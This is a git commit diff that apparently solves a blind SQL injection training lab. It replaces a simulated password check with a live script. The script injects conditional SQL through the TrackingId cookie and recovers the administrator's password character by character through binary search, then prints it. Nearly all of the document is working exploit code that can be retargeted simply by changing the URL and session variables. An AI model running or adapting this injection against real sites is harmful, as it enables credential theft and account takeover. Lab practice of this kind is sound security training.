5eab57df951801c907fca9b12a6692d15cfd37d1
Filip Wiśniewski <fi.wis@pm.me>
2026-02-08 04:35:44 +0100

    Solution: connect to the lab

--- sqli/blind_sqli_with_conditional_responses.py
+++ sqli/blind_sqli_with_conditional_responses.py
@@ -1,44 +1,56 @@
 import string
+import requests
+import os
+from dotenv import load_dotenv
+import time
+
+load_dotenv()
+
+DEFAULT_URL = os.getenv('DEFAULT_URL', '')
+TRACKING_ID = os.getenv('TRACKING_ID', '')
+SESSION = os.getenv('SESSION', '')
+REFERER = os.getenv('REFERER', '')
+
+session = requests.Session()
+session.headers.update({
+    'User-Agent': 'Mozilla/5.0',
+    'Referer': REFERER
+})
+session.cookies.set('session', SESSION)
+
 
 AVAILABLE_CHARACTERS = sorted(string.printable)
+SEARCHED_STRING = 'Welcome back'
 
 
-example = 'example password'
-
-def get_current_character(password_index):
-    '''
-    Utility method adjusting the behavior to simulate DB query
-    
-    :param password_index: index of a char within password we're checking
-    '''
-    try:
-        char = example[password_index - 1]
-        return char
-    except IndexError:
-        return ''
-
-def is_less(password_index, checked_character):
-    return get_current_character(password_index) < checked_character
-
-def is_hit(password_index, checked_character):
-    return get_current_character(password_index) == checked_character
+def _is_less(password_index, checked_character):
+    payload = f"{TRACKING_ID}' AND (SELECT SUBSTRING(password FROM {password_index} FOR 1) FROM users WHERE username='administrator')<'{checked_character}'--"
+    response = session.get(DEFAULT_URL, cookies={ "TrackingId": payload})
+    return SEARCHED_STRING in response.text
 
 
-def find_char_for_index(password_index, start, stop):
+def _is_hit(password_index, checked_character):
+    payload = f"{TRACKING_ID}' AND (SELECT SUBSTRING(password FROM {password_index} FOR 1) FROM users WHERE username='administrator')='{checked_character}'--"
+    response = session.get(DEFAULT_URL, cookies={ "TrackingId": payload})
+    return SEARCHED_STRING in response.text
+
+
+def _find_char_for_index(password_index, start, stop):
+    time.sleep(0.1) # slow down to prevent server failures
+
     if start > stop:
         return None
 
     checked_index = (start + stop) // 2
     checked_character = AVAILABLE_CHARACTERS[checked_index]
 
-    if is_less(password_index, checked_character):
-        return find_char_for_index(password_index, start, checked_index - 1)
+    if _is_less(password_index, checked_character):
+        return _find_char_for_index(password_index, start, checked_index - 1)
     else:
-        if is_hit(password_index, checked_character):
+        if _is_hit(password_index, checked_character):
             return checked_character
         else:
-            return find_char_for_index(password_index, checked_index + 1, stop)
-
+            return _find_char_for_index(password_index, checked_index + 1, stop)
 
 
 def detect_password():
@@ -46,7 +58,7 @@ def detect_password():
     char_index = 1
 
     while True:
-        char = find_char_for_index(char_index, 0, len(AVAILABLE_CHARACTERS) - 1)
+        char = _find_char_for_index(char_index, 0, len(AVAILABLE_CHARACTERS) - 1)
         if not char:
             break
         else:
@@ -55,8 +67,6 @@ def detect_password():
 
     return password
 
-
-      
 
 password = detect_password()
 print(password)
